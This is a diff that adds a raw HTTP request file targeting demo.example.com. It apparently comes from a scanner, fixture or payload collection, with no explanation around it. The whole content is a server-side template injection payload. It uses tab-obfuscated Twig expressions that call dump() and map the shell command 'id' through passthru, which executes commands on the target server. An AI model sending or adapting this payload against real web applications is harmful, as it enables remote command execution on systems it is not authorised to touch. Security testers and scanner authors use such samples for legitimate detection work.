@@ -1,0 +1,4 @@
+GET /a?data={{%09dump()%09}}{{%09['id']|map('passthru')%09}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
